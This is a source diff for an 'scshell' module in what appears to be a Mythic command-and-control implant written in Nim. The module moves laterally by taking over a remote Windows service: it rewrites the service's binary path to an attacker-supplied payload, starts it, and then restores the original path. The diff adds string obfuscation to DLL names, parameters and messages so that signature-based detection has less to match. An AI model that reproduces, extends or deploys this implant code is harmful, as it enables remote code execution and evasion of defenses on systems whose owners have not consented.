@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strformat]
 import ../tasks/token_manager
 
@@ -14,25 +15,25 @@ when defined(windows):
     SERVICE_ERROR_IGNORE = 0
   
   proc OpenSCManagerW(lpMachineName: LPCWSTR, lpDatabaseName: LPCWSTR, dwDesiredAccess: DWORD): SC_HANDLE
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc OpenServiceW(hSCManager: SC_HANDLE, lpServiceName: LPCWSTR, dwDesiredAccess: DWORD): SC_HANDLE
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc CloseServiceHandle(hSCObject: SC_HANDLE): WINBOOL
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc QueryServiceConfigW(hService: SC_HANDLE, lpServiceConfig: pointer, cbBufSize: DWORD, pcbBytesNeeded: ptr DWORD): WINBOOL
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc ChangeServiceConfigW(hService: SC_HANDLE, dwServiceType: DWORD, dwStartType: DWORD, dwErrorControl: DWORD,
                            lpBinaryPathName: LPCWSTR, lpLoadOrderGroup: LPCWSTR, lpdwTagId: ptr DWORD,
                            lpDependencies: LPCWSTR, lpServiceStartName: LPCWSTR, lpPassword: LPCWSTR,
                            lpDisplayName: LPCWSTR): WINBOOL
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   proc StartServiceW(hService: SC_HANDLE, dwNumServiceArgs: DWORD, lpServiceArgVectors: ptr LPCWSTR): WINBOOL
-    {.importc, dynlib: "advapi32.dll", stdcall.}
+    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
   
   type
     QUERY_SERVICE_CONFIGW_SCSHELL = object
@@ -51,9 +52,9 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
       # Parse parameters
-      let target = params["target"].getStr()
-      let service = params["service"].getStr()
-      let payload = params["payload"].getStr()
+      let target = params[obf("target")].getStr()
+      let service = params[obf("service")].getStr()
+      let payload = params[obf("payload")].getStr()
       
       debug &"[DEBUG] Scshell: Target={target}, Service={service}, Payload={payload}"
       
@@ -72,14 +73,14 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
       let scm = OpenSCManagerW(cast[LPCWSTR](addr targetWide[0]), nil, SC_MANAGER_ALL_ACCESS)
       if scm == 0:
         let err = GetLastError()
-        return mythicError(taskId, &"OpenSCManagerW failed: {err}")
+        return mythicError(taskId, obf("OpenSCManagerW failed: ") & $err)
       
       # Open Service
       let svc = OpenServiceW(scm, cast[LPCWSTR](addr serviceWide[0]), SERVICE_ALL_ACCESS)
       if svc == 0:
         let err = GetLastError()
         discard CloseServiceHandle(scm)
-        return mythicError(taskId, &"OpenServiceW failed: {err}")
+        return mythicError(taskId, obf("OpenServiceW failed: ") & $err)
       
       # Query service config to get original path
       var needed: DWORD = 0
@@ -88,7 +89,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         let err = GetLastError()
         discard CloseServiceHandle(svc)
         discard CloseServiceHandle(scm)
-        return mythicError(taskId, &"QueryServiceConfigW failed to get needed size: {err}")
+        return mythicError(taskId, obf("QueryServiceConfigW failed to get needed size: ") & $err)
       
       var buffer = newSeq[byte](needed)
       let qscPtr = cast[ptr QUERY_SERVICE_CONFIGW_SCSHELL](addr buffer[0])
@@ -97,7 +98,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         let err = GetLastError()
         discard CloseServiceHandle(svc)
         discard CloseServiceHandle(scm)
-        return mythicError(taskId, &"QueryServiceConfigW failed: {err}")
+        return mythicError(taskId, obf("QueryServiceConfigW failed: ") & $err)
       
       # Save original path
       var origPath = ""
@@ -112,7 +113,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         let err = GetLastError()
         discard CloseServiceHandle(svc)
         discard CloseServiceHandle(scm)
-        return mythicError(taskId, &"ChangeServiceConfigW (set payload) failed: {err}")
+        return mythicError(taskId, obf("ChangeServiceConfigW (set payload) failed: ") & $err)
       
       debug "[DEBUG] Scshell: Service configuration changed, starting service..."
       
@@ -123,7 +124,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         if err != 1053:
           discard CloseServiceHandle(svc)
           discard CloseServiceHandle(scm)
-          return mythicError(taskId, &"StartServiceW failed: {err}")
+          return mythicError(taskId, obf("StartServiceW failed: ") & $err)
       
       # Restore original service config
       var origPathWide = newWideCString(origPath)
@@ -132,7 +133,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         let err = GetLastError()
         discard CloseServiceHandle(svc)
         discard CloseServiceHandle(scm)
-        return mythicError(taskId, &"ChangeServiceConfigW (restore) failed: {err}")
+        return mythicError(taskId, obf("ChangeServiceConfigW (restore) failed: ") & $err)
       
       debug "[DEBUG] Scshell: Service configuration restored"
       
@@ -140,10 +141,10 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
       discard CloseServiceHandle(svc)
       discard CloseServiceHandle(scm)
       
-      return mythicSuccess(taskId, "Service started successfully")
+      return mythicSuccess(taskId, obf("Service started successfully"))
       
     except Exception as e:
-      return mythicError(taskId, &"Scshell error: {e.msg}")
+      return mythicError(taskId, obf("Scshell error: ") & e.msg)
   
-  when defined(posix):
-    return mythicError(taskId, "Scshell is only available on Windows")
+  when defined(linux):
+    return mythicError(taskId, obf("Scshell is only available on Windows"))
